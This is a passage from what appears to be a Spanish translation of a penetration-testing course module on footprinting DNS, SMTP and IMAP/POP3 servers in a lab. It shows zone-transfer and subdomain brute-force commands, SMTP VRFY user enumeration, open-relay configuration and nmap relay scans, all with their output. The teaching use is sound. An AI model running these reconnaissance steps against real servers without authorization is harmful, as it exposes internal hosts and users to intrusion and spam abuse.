5    IN     PTR    server1.domain.com.
7    IN     MX     mx.domain.com.
...SNIP...
```

---

## Configuración Peligrosa

Hay muchas maneras en que un servidor DNS puede ser atacado. Por ejemplo, se puede encontrar una lista de vulnerabilidades dirigidas al servidor BIND9 en [CVEdetalles](https://www.cvedetails.com/product/144/ISC-Bind.html?vendor_id=64). Además, SecurityTrails proporciona un corto [lista](https://securitytrails.com/blog/most-popular-types-dns-attacks) de los ataques más populares en servidores DNS.

Algunas de las configuraciones que podemos ver a continuación conducen a estas vulnerabilidades, entre otras. Debido a que el DNS puede ser muy complicado y es muy fácil que los errores se infiltren en este servicio, lo que obliga a un administrador a solucionar el problema hasta que encuentre una solución exacta. Esto a menudo conduce a la liberación de elementos para que partes de la infraestructura funcionen según lo planeado y deseado. En tales casos, la funcionalidad tiene una prioridad más alta que la seguridad, lo que conduce a configuraciones erróneas y vulnerabilidades.

|**Opción**|**Descripción**|
|---|---|
|`allow-query`|Define qué hosts pueden enviar solicitudes al servidor DNS.|
|`allow-recursion`|Define qué hosts pueden enviar solicitudes recursivas al servidor DNS.|
|`allow-transfer`|Define qué hosts pueden recibir transferencias de zona desde el servidor DNS.|
|`zone-statistics`|Recopila datos estadísticos de zonas.|

---

## Huella del Servicio

La huella en los servidores DNS se realiza como resultado de las solicitudes que enviamos. Entonces, en primer lugar, se puede consultar al servidor DNS sobre qué otros servidores de nombres se conocen. Hacemos esto usando el registro NS y la especificación del servidor DNS que queremos consultar usando el `@` carácter. Esto se debe a que si hay otros servidores DNS, también podemos usarlos y consultar los registros. Sin embargo, otros servidores DNS pueden configurarse de manera diferente y, además, pueden ser permanentes para otras zonas.

#### DIG - NS Consulta

  DNS

```shell-session
vcrdcr@htb[/htb]$ dig ns inlanefreight.htb @10.129.14.128

; <<>> DiG 9.16.1-Ubuntu <<>> ns inlanefreight.htb @10.129.14.128
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 45010
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: ce4d8681b32abaea0100000061475f73842c401c391690c7 (good)
;; QUESTION SECTION:
;inlanefreight.htb.             IN      NS

;; ANSWER SECTION:
inlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.

;; ADDITIONAL SECTION:
ns.inlanefreight.htb.   604800  IN      A       10.129.34.136

;; Query time: 0 msec
;; SERVER: 10.129.14.128#53(10.129.14.128)
;; WHEN: So Sep 19 18:04:03 CEST 2021
;; MSG SIZE  rcvd: 107
```

A veces también es posible consultar la versión de un servidor DNS utilizando una consulta de clase CHAOS y escribir TXT. Sin embargo, esta entrada debe existir en el servidor DNS. Para esto, podríamos usar el siguiente comando:

#### DIG - Consulta de versiones

  DNS

```shell-session
vcrdcr@htb[/htb]$ dig CH TXT version.bind 10.129.120.85

; <<>> DiG 9.10.6 <<>> CH TXT version.bind
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 47786
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; ANSWER SECTION:
version.bind.       0       CH      TXT     "9.10.6-P1"

;; ADDITIONAL SECTION:
version.bind.       0       CH      TXT     "9.10.6-P1-Debian"

;; Query time: 2 msec
;; SERVER: 10.129.120.85#53(10.129.120.85)
;; WHEN: Wed Jan 05 20:23:14 UTC 2023
;; MSG SIZE  rcvd: 101
```

Podemos usar la opción `ANY` para ver todos los registros disponibles. Esto hará que el servidor nos muestre todas las entradas disponibles que está dispuesto a revelar. Es importante tener en cuenta que no se mostrarán todas las entradas de las zonas.

#### DIG - CUALQUIER Consulta

  DNS

```shell-session
vcrdcr@htb[/htb]$ dig any inlanefreight.htb @10.129.14.128

; <<>> DiG 9.16.1-Ubuntu <<>> any inlanefreight.htb @10.129.14.128
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 7649
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 064b7e1f091b95120100000061476865a6026d01f87d10ca (good)
;; QUESTION SECTION:
;inlanefreight.htb.             IN      ANY

;; ANSWER SECTION:
inlanefreight.htb.      604800  IN      TXT     "v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
inlanefreight.htb.      604800  IN      TXT     "atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
inlanefreight.htb.      604800  IN      TXT     "MS=ms97310371"
inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.

;; ADDITIONAL SECTION:
ns.inlanefreight.htb.   604800  IN      A       10.129.34.136

;; Query time: 0 msec
;; SERVER: 10.129.14.128#53(10.129.14.128)
;; WHEN: So Sep 19 18:42:13 CEST 2021
;; MSG SIZE  rcvd: 437
```

`Zone transfer` se refiere a la transferencia de zonas a otro servidor en DNS, que generalmente ocurre a través del puerto TCP 53. Este procedimiento se abrevia `Asynchronous Full Transfer Zone` (`AXFR`). Dado que una falla de DNS generalmente tiene consecuencias graves para una empresa, el archivo de zona se mantiene casi invariablemente idéntico en varios servidores de nombres. Cuando se realizan cambios, se debe garantizar que todos los servidores tengan los mismos datos. La sincronización entre los servidores implicados se realiza mediante transferencia de zona. Usando una clave secreta `rndc-key`, que hemos visto inicialmente en la configuración predeterminada, los servidores se aseguran de que se comuniquen con su propio maestro o esclavo. La transferencia de zona implica la mera transferencia de archivos o registros y la detección de discrepancias en los conjuntos de datos de los servidores involucrados.

Los datos originales de una zona se encuentran en un servidor DNS, que se llama el `primary` servidor de nombres para esta zona. Sin embargo, para aumentar la confiabilidad, realizar una distribución de carga simple o proteger el primario de los ataques, se instalan uno o más servidores adicionales en la práctica en casi todos los casos, que se denominan `secondary` servidores de nombres para esta zona. Para algunos `Top-Level Domains` (`TLDs`), haciendo archivos de zona para el `Second Level Domains` accesible en al menos dos servidores es obligatorio.

Las entradas DNS generalmente solo se crean, modifican o eliminan en la primaria. Esto se puede hacer editando manualmente el archivo de zona relevante o automáticamente mediante una actualización dinámica desde una base de datos. Un servidor DNS que sirve como fuente directa para sincronizar un archivo de zona se llama maestro. Un servidor DNS que obtiene datos de zona de un maestro se llama esclavo. Un primario es siempre un maestro, mientras que un secundario puede ser tanto un esclavo como un maestro.

El esclavo busca el `SOA` registre la zona relevante del maestro en ciertos intervalos, el llamado tiempo de actualización, generalmente una hora, y compare los números de serie. Si el número de serie del registro SOA del maestro es mayor que el del esclavo, los conjuntos de datos ya no coinciden.

#### DIG - AXFR Transferencia de zona

  DNS

```shell-session
vcrdcr@htb[/htb]$ dig axfr inlanefreight.htb @10.129.14.128

; <<>> DiG 9.16.1-Ubuntu <<>> axfr inlanefreight.htb @10.129.14.128
;; global options: +cmd
inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.      604800  IN      TXT     "MS=ms97310371"
inlanefreight.htb.      604800  IN      TXT     "atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
inlanefreight.htb.      604800  IN      TXT     "v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
inlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.
app.inlanefreight.htb.  604800  IN      A       10.129.18.15
internal.inlanefreight.htb. 604800 IN   A       10.129.1.6
mail1.inlanefreight.htb. 604800 IN      A       10.129.18.201
ns.inlanefreight.htb.   604800  IN      A       10.129.34.136
inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 4 msec
;; SERVER: 10.129.14.128#53(10.129.14.128)
;; WHEN: So Sep 19 18:51:19 CEST 2021
;; XFR size: 9 records (messages 1, bytes 520)
```

Si el administrador usó una subred para el `allow-transfer` opción para fines de prueba o como solución alternativa o configúrela en `any`, todos consultarían todo el archivo de zona en el servidor DNS. Además, se pueden consultar otras zonas, que incluso pueden mostrar direcciones IP internas y nombres de host.

#### DIG - AXFR Zone Transfer - Interno

  DNS

```shell-session
vcrdcr@htb[/htb]$ dig axfr internal.inlanefreight.htb @10.129.14.128

; <<>> DiG 9.16.1-Ubuntu <<>> axfr internal.inlanefreight.htb @10.129.14.128
;; global options: +cmd
internal.inlanefreight.htb. 604800 IN   SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
internal.inlanefreight.htb. 604800 IN   TXT     "MS=ms97310371"
internal.inlanefreight.htb. 604800 IN   TXT     "atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
internal.inlanefreight.htb. 604800 IN   TXT     "v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
internal.inlanefreight.htb. 604800 IN   NS      ns.inlanefreight.htb.
dc1.internal.inlanefreight.htb. 604800 IN A     10.129.34.16
dc2.internal.inlanefreight.htb. 604800 IN A     10.129.34.11
mail1.internal.inlanefreight.htb. 604800 IN A   10.129.18.200
ns.internal.inlanefreight.htb. 604800 IN A      10.129.34.136
vpn.internal.inlanefreight.htb. 604800 IN A     10.129.1.6
ws1.internal.inlanefreight.htb. 604800 IN A     10.129.1.34
ws2.internal.inlanefreight.htb. 604800 IN A     10.129.1.35
wsus.internal.inlanefreight.htb. 604800 IN A    10.129.18.2
internal.inlanefreight.htb. 604800 IN   SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 0 msec
;; SERVER: 10.129.14.128#53(10.129.14.128)
;; WHEN: So Sep 19 18:53:11 CEST 2021
;; XFR size: 15 records (messages 1, bytes 664)
```

El individuo `A` los registros con los nombres de host también se pueden encontrar con la ayuda de un ataque de fuerza bruta. Para hacer esto, necesitamos una lista de posibles nombres de host, que utilizamos para enviar las solicitudes en orden. Dichas listas se proporcionan, por ejemplo, por [Seclistas](https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt).

Una opción sería ejecutar un `for-loop` en Bash que enumera estas entradas y envía la consulta correspondiente al servidor DNS deseado.

#### Subdominio Brute Forcing

  DNS

```shell-session
vcrdcr@htb[/htb]$ for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done

ns.inlanefreight.htb.   604800  IN      A       10.129.34.136
mail1.inlanefreight.htb. 604800 IN      A       10.129.18.201
app.inlanefreight.htb.  604800  IN      A       10.129.18.15
```

Se pueden usar muchas herramientas diferentes para esto, y la mayoría de ellas funcionan de la misma manera. Una de estas herramientas es, por ejemplo [DNSeno](https://github.com/fwaeytens/dnsenum).

  DNS

```shell-session
vcrdcr@htb[/htb]$ dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb

dnsenum VERSION:1.2.6

-----   inlanefreight.htb   -----


Host's addresses:
__________________



Name Servers:
______________

ns.inlanefreight.htb.                    604800   IN    A        10.129.34.136


Mail (MX) Servers:
___________________



Trying Zone Transfers and getting Bind Versions:
_________________________________________________

unresolvable name: ns.inlanefreight.htb at /usr/bin/dnsenum line 900 thread 1.

Trying Zone Transfer for inlanefreight.htb on ns.inlanefreight.htb ...
AXFR record query failed: no nameservers


Brute forcing with /home/cry0l1t3/Pentesting/SecLists/Discovery/DNS/subdomains-top1million-110000.txt:
_______________________________________________________________________________________________________

ns.inlanefreight.htb.                    604800   IN    A        10.129.34.136
mail1.inlanefreight.htb.                 604800   IN    A        10.129.18.201
app.inlanefreight.htb.                   604800   IN    A        10.129.18.15
ns.inlanefreight.htb.                    604800   IN    A        10.129.34.136

...SNIP...
done.
```



# SMTP

---

El `Simple Mail Transfer Protocol` (`SMTP`) es un protocolo para enviar correos electrónicos en una red IP. Se puede utilizar entre un cliente de correo electrónico y un servidor de correo saliente o entre dos servidores SMTP. SMTP a menudo se combina con los protocolos IMAP o POP3, que pueden buscar correos electrónicos y enviar correos electrónicos. En principio, es un protocolo basado en cliente-servidor, aunque SMTP se puede utilizar entre un cliente y un servidor y entre dos servidores SMTP. En este caso, un servidor actúa efectivamente como cliente.

De forma predeterminada, los servidores SMTP aceptan solicitudes de conexión en el puerto `25`. Sin embargo, los servidores SMTP más nuevos también usan otros puertos como el puerto TCP `587`. Este puerto se utiliza para recibir correo de usuarios/servidores autenticados, generalmente utilizando el comando STARTTLS para cambiar la conexión de texto sin formato existente a una conexión cifrada. Los datos de autenticación están protegidos y ya no son visibles en texto sin formato a través de la red. Al comienzo de la conexión, la autenticación se produce cuando el cliente confirma su identidad con un nombre de usuario y contraseña. Los correos electrónicos pueden ser transmitidos. Para este propósito, el cliente envía las direcciones del remitente y del destinatario del servidor, el contenido del correo electrónico y otra información y parámetros. Después de que se haya transmitido el correo electrónico, la conexión se termina de nuevo. El servidor de correo electrónico comienza a enviar el correo electrónico a otro servidor SMTP.

SMTP funciona sin cifrar sin más medidas y transmite todos los comandos, datos o información de autenticación en texto sin formato. Para evitar la lectura no autorizada de datos, el SMTP se utiliza junto con el cifrado SSL/TLS. Bajo ciertas circunstancias, un servidor utiliza un puerto que no sea el puerto TCP estándar `25` para la conexión cifrada, por ejemplo, puerto TCP `465`.

Una función esencial de un servidor SMTP es evitar el spam utilizando mecanismos de autenticación que permiten que solo los usuarios autorizados envíen correos electrónicos. Para este propósito, la mayoría de los servidores SMTP modernos admiten la extensión de protocolo ESMTP con SMTP-Auth. Después de enviar su correo electrónico, el cliente SMTP, también conocido como `Mail User Agent` (`MUA`), lo convierte en un encabezado y un cuerpo y carga ambos en el servidor SMTP. Esto tiene un llamado `Mail Transfer Agent` (`MTA`), la base de software para enviar y recibir correos electrónicos. La MTA verifica el correo electrónico en busca de tamaño y spam y luego lo almacena. Para aliviar la MTA, ocasionalmente está precedida por un `Mail Submission Agent` (`MSA`), que comprueba la validez, es decir, el origen del correo electrónico. Esto `MSA` también se llama `Relay` servidor. Estos son muy importantes más adelante, como los llamados `Open Relay Attack`se puede llevar a cabo en muchos servidores SMTP debido a una configuración incorrecta. Discutiremos este ataque y cómo identificar el punto débil para él un poco más tarde. La MTA luego busca en el DNS la dirección IP del servidor de correo del destinatario.

A su llegada al servidor SMTP de destino, los paquetes de datos se vuelven a ensamblar para formar un correo electrónico completo. A partir de ahí, el `Mail delivery agent` (`MDA`) lo transfiere al buzón del destinatario.

|Cliente (`MUA`)|`➞`|Agente de Presentación (`MSA`)|`➞`|Retransmisión Abierta (`MTA`)|`➞`|Agente de Entrega de Correo (`MDA`)|`➞`|Buzón (`POP3`/`IMAP`)|
|---|---|---|---|---|---|---|---|---|

Pero SMTP tiene dos desventajas inherentes al protocolo de red.

1. La primera es que enviar un correo electrónico utilizando SMTP no devuelve una confirmación de entrega utilizable. Aunque las especificaciones del protocolo proporcionan este tipo de notificación, su formato no se especifica de forma predeterminada, por lo que generalmente solo se devuelve un mensaje de error en inglés, incluido el encabezado del mensaje no entregado.
    
2. Los usuarios no se autentican cuando se establece una conexión y, por lo tanto, el remitente de un correo electrónico no es confiable. Como resultado, los relés SMTP abiertos a menudo se usan incorrectamente para enviar spam en masa. Los originadores utilizan direcciones de remitente falsas arbitrarias para que este propósito no se rastree (falsificación de correo). Hoy en día, se utilizan muchas técnicas de seguridad diferentes para evitar el mal uso de los servidores SMTP. Por ejemplo, los correos electrónicos sospechosos se rechazan o se mueven a cuarentena (carpeta de spam). Por ejemplo, los responsables de esto son el protocolo de identificación [DominioKeys](http://dkim.org/) (`DKIM`), el [Marco de Política del Remitente](https://dmarcian.com/what-is-spf/) (`SPF`).
    

Para este propósito, se ha desarrollado una extensión para SMTP llamada `Extended SMTP` (`ESMTP`). Cuando las personas hablan de SMTP en general, generalmente se refieren a ESMTP. ESMTP utiliza TLS, que se realiza después de la `EHLO` comando enviando `STARTTLS`. Esto inicializa la conexión SMTP protegida por SSL, y a partir de este momento, toda la conexión está encriptada y, por lo tanto, es más o menos segura. Ahora [AUTÉNTICO LLANURA](https://www.samlogic.net/articles/smtp-commands-reference-auth.htm) la extensión para la autenticación también se puede utilizar de forma segura.

---

## Configuración Predeterminada

Cada servidor SMTP se puede configurar de muchas maneras, al igual que todos los demás servicios. Sin embargo, hay diferencias porque el servidor SMTP solo es responsable de enviar y reenviar correos electrónicos.

#### Configuración Predeterminada

  SMTP

```shell-session
vcrdcr@htb[/htb]$ cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"

smtpd_banner = ESMTP Server 
biff = no
append_dot_mydomain = no
readme_directory = no
compatibility_level = 2
smtp_tls_session_cache_database = btree:${data_directory}/smtp_scache
myhostname = mail1.inlanefreight.htb
alias_maps = hash:/etc/aliases
alias_database = hash:/etc/aliases
smtp_generic_maps = hash:/etc/postfix/generic
mydestination = $myhostname, localhost 
masquerade_domains = $myhostname
mynetworks = 127.0.0.0/8 10.129.0.0/16
mailbox_size_limit = 0
recipient_delimiter = +
smtp_bind_address = 0.0.0.0
inet_protocols = ipv4
smtpd_helo_restrictions = reject_invalid_hostname
home_mailbox = /home/postfix
```

El envío y la comunicación también se realizan mediante comandos especiales que hacen que el servidor SMTP haga lo que el usuario requiere.

|**Comando**|**Descripción**|
|---|---|
|`AUTH PLAIN`|AUTH es una extensión de servicio utilizada para autenticar al cliente.|
|`HELO`|El cliente inicia sesión con el nombre de su computadora y, por lo tanto, inicia la sesión.|
|`MAIL FROM`|El cliente nombra al remitente de correo electrónico.|
|`RCPT TO`|El cliente nombra al destinatario del correo electrónico.|
|`DATA`|El cliente inicia la transmisión del correo electrónico.|
|`RSET`|El cliente aborta la transmisión iniciada pero mantiene la conexión entre el cliente y el servidor.|
|`VRFY`|El cliente comprueba si hay un buzón disponible para la transferencia de mensajes.|
|`EXPN`|El cliente también comprueba si hay un buzón disponible para enviar mensajes con este comando.|
|`NOOP`|El cliente solicita una respuesta del servidor para evitar la desconexión debido al tiempo de espera.|
|`QUIT`|El cliente termina la sesión.|

Para interactuar con el servidor SMTP, podemos utilizar el `telnet` herramienta para inicializar una conexión TCP con el servidor SMTP. La inicialización real de la sesión se realiza con el comando mencionado anteriormente `HELO` o `EHLO`.

#### Telnet - HELO/EHLO

  SMTP

```shell-session
vcrdcr@htb[/htb]$ telnet 10.129.14.128 25

Trying 10.129.14.128...
Connected to 10.129.14.128.
Escape character is '^]'.
220 ESMTP Server 


HELO mail1.inlanefreight.htb

250 mail1.inlanefreight.htb


EHLO mail1

250-mail1.inlanefreight.htb
250-PIPELINING
250-SIZE 10240000
250-ETRN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING
```

El comando `VRFY` se puede utilizar para enumerar los usuarios existentes en el sistema. Sin embargo, esto no siempre funciona. Dependiendo de cómo esté configurado el servidor SMTP, el servidor SMTP puede emitir `code 252` y confirmar la existencia de un usuario que no existe en el sistema. Se puede encontrar una lista de todos los códigos de respuesta SMTP [aquí](https://serversmtp.com/smtp-error/).

#### Telnet - VRFY

  SMTP

```shell-session
vcrdcr@htb[/htb]$ telnet 10.129.14.128 25

Trying 10.129.14.128...
Connected to 10.129.14.128.
Escape character is '^]'.
220 ESMTP Server 

VRFY root

252 2.0.0 root


VRFY cry0l1t3

252 2.0.0 cry0l1t3


VRFY testuser

252 2.0.0 testuser


VRFY aaaaaaaaaaaaaaaaaaaaaaaaaaaa

252 2.0.0 aaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

Por lo tanto, uno nunca debe confiar completamente en los resultados de las herramientas automáticas. Después de todo, ejecutan comandos preconfigurados, pero ninguna de las funciones indica explícitamente cómo el administrador configura el servidor probado.

A veces es posible que tengamos que trabajar a través de un proxy web. También podemos hacer que este proxy web se conecte al servidor SMTP. El comando que enviaríamos se vería así: `CONNECT 10.129.14.128:25 HTTP/1.0`

Todos los comandos que ingresamos en la línea de comandos para enviar un correo electrónico que conocemos de todos los programas de clientes de correo electrónico como Thunderbird, Gmail, Outlook y muchos otros. Especificamos el `subject`, a quién debe ir el correo electrónico, CC, BCC, y la información que queremos compartir con otros. Por supuesto, lo mismo funciona desde la línea de comandos.

#### Enviar un Email

  SMTP

```shell-session
vcrdcr@htb[/htb]$ telnet 10.129.14.128 25

Trying 10.129.14.128...
Connected to 10.129.14.128.
Escape character is '^]'.
220 ESMTP Server


EHLO inlanefreight.htb

250-mail1.inlanefreight.htb
250-PIPELINING
250-SIZE 10240000
250-ETRN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING


MAIL FROM: <cry0l1t3@inlanefreight.htb>

250 2.1.0 Ok


RCPT TO: <mrb3n@inlanefreight.htb> NOTIFY=success,failure

250 2.1.5 Ok


DATA

354 End data with <CR><LF>.<CR><LF>

From: <cry0l1t3@inlanefreight.htb>
To: <mrb3n@inlanefreight.htb>
Subject: DB
Date: Tue, 28 Sept 2021 16:32:51 +0200
Hey man, I am trying to access our XY-DB but the creds don't work. 
Did you make any changes there?
.

250 2.0.0 Ok: queued as 6E1CF1681AB


QUIT

221 2.0.0 Bye
Connection closed by foreign host.
```

El encabezado del correo es el portador de una gran cantidad de información interesante en un correo electrónico. Entre otras cosas, proporciona información sobre el remitente y el destinatario, la hora de envío y llegada, las estaciones que el correo electrónico transmitió en su camino, el contenido y el formato del mensaje, y el remitente y el destinatario.

Parte de esta información es obligatoria, como la información del remitente y cuándo se creó el correo electrónico. Otra información es opcional. Sin embargo, el encabezado del correo electrónico no contiene ninguna información necesaria para la entrega técnica. Se transmite como parte del protocolo de transmisión. Tanto el remitente como el destinatario pueden acceder al encabezado de un correo electrónico, aunque no es visible a primera vista. La estructura de un encabezado de correo electrónico se define por [RFC5322](https://datatracker.ietf.org/doc/html/rfc5322).

---

## Configuración Peligrosa

Para evitar que los correos electrónicos enviados sean filtrados por filtros de spam y no lleguen al destinatario, el remitente puede usar un servidor de retransmisión en el que confíe el destinatario. Es un servidor SMTP que es conocido y verificado por todos los demás. Como regla general, el remitente debe autenticarse en el servidor de retransmisión antes de usarlo.

A menudo, los administradores no tienen una visión general de qué rangos de IP tienen que permitir. Esto da como resultado una configuración incorrecta del servidor SMTP que aún encontraremos a menudo en pruebas de penetración externas e internas. Por lo tanto, permiten que todas las direcciones IP no causen errores en el tráfico de correo electrónico y, por lo tanto, no perturben o interrumpan involuntariamente la comunicación con clientes potenciales y actuales.

#### Abrir Configuración de Relé

  SMTP

```shell-session
mynetworks = 0.0.0.0/0
```

Con esta configuración, este servidor SMTP puede enviar correos electrónicos falsos y, por lo tanto, inicializar la comunicación entre múltiples partes. Otra posibilidad de ataque sería falsificar el correo electrónico y leerlo.

---

## Huella del Servicio

Los scripts predeterminados de Nmap incluyen `smtp-commands`, que utiliza el `EHLO` comando para enumerar todos los comandos posibles que se pueden ejecutar en el servidor SMTP de destino.

#### Mapa

  SMTP

```shell-session
vcrdcr@htb[/htb]$ sudo nmap 10.129.14.128 -sC -sV -p25

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00025s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
MAC Address: 00:00:00:00:00:00 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.09 seconds
```

Sin embargo, también podemos usar el [smtp-retransmisión abierta](https://nmap.org/nsedoc/scripts/smtp-open-relay.html) Script NSE para identificar el servidor SMTP de destino como un relé abierto utilizando 16 pruebas diferentes. Si también imprimimos la salida del escaneo en detalle, también podremos ver qué pruebas está ejecutando el script.

#### Nmap - Retransmisión Abierta

  SMTP

```shell-session
vcrdcr@htb[/htb]$ sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-30 02:29 CEST
NSE: Loaded 1 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 02:29
Completed NSE at 02:29, 0.00s elapsed
Initiating ARP Ping Scan at 02:29
Scanning 10.129.14.128 [1 port]
Completed ARP Ping Scan at 02:29, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 02:29
Completed Parallel DNS resolution of 1 host. at 02:29, 0.03s elapsed
Initiating SYN Stealth Scan at 02:29
Scanning 10.129.14.128 [1 port]
Discovered open port 25/tcp on 10.129.14.128
Completed SYN Stealth Scan at 02:29, 0.06s elapsed (1 total ports)
NSE: Script scanning 10.129.14.128.
Initiating NSE at 02:29
Completed NSE at 02:29, 0.07s elapsed
Nmap scan report for 10.129.14.128
Host is up (0.00020s latency).

PORT   STATE SERVICE
25/tcp open  smtp
| smtp-open-relay: Server is an open relay (16/16 tests)
|  MAIL FROM:<> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@nmap.scanme.org> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@ESMTP> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest%nmap.scanme.org@[10.129.14.128]>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest%nmap.scanme.org@ESMTP>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<"relaytest@nmap.scanme.org">
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<"relaytest%nmap.scanme.org">
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest@nmap.scanme.org@[10.129.14.128]>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<"relaytest@nmap.scanme.org"@[10.129.14.128]>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest@nmap.scanme.org@ESMTP>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<@[10.129.14.128]:relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<@ESMTP:relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<nmap.scanme.org!relaytest>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<nmap.scanme.org!relaytest@[10.129.14.128]>
|_ MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<nmap.scanme.org!relaytest@ESMTP>
MAC Address: 00:00:00:00:00:00 (VMware)

NSE: Script Post-scanning.
Initiating NSE at 02:29
Completed NSE at 02:29, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds
           Raw packets sent: 2 (72B) | Rcvd: 2 (72B)
```


# IMAP/POP3

---

Con la ayuda de la `Internet Message Access Protocol` (`IMAP`), el acceso a los correos electrónicos desde un servidor de correo es posible. A diferencia del `Post Office Protocol` (`POP3`), IMAP permite la gestión en línea de correos electrónicos directamente en el servidor y admite estructuras de carpetas. Por lo tanto, es un protocolo de red para la gestión en línea de correos electrónicos en un servidor remoto. El protocolo está basado en cliente-servidor y permite la sincronización de un cliente de correo electrónico local con el buzón en el servidor, proporcionando una especie de sistema de archivos de red para correos electrónicos, lo que permite la sincronización sin problemas en varios clientes independientes. POP3, por otro lado, no tiene la misma funcionalidad que IMAP, y solo proporciona listar, recuperar y eliminar correos electrónicos como funciones en el servidor de correo electrónico. Por lo tanto, los protocolos como IMAP deben usarse para funcionalidades adicionales, como buzones jerárquicos directamente en el servidor de correo, acceso a múltiples buzones durante una sesión y preselección de correos electrónicos.

Los clientes acceden a estas estructuras en línea y pueden crear copias locales. Incluso en varios clientes, esto da como resultado una base de datos uniforme. Los correos electrónicos permanecen en el servidor hasta que se eliminan. IMAP está basado en texto y tiene funciones extendidas, como navegar por correos electrónicos directamente en el servidor. También es posible que varios usuarios accedan al servidor de correo electrónico simultáneamente. Sin una conexión activa al servidor, administrar correos electrónicos es imposible. Sin embargo, algunos clientes ofrecen un modo fuera de línea con una copia local del buzón. El cliente sincroniza todos los cambios locales fuera de línea cuando se restablece una conexión.

El cliente establece la conexión al servidor a través del puerto `143`. Para la comunicación, utiliza comandos basados en texto en `ASCII` formato. Se pueden enviar varios comandos en sucesión sin esperar la confirmación del servidor. Las confirmaciones posteriores del servidor se pueden asignar a los comandos individuales utilizando los identificadores enviados junto con los comandos. Inmediatamente después de establecer la conexión, el usuario se autentica por nombre de usuario y contraseña al servidor. El acceso al buzón deseado solo es posible después de una autenticación exitosa.

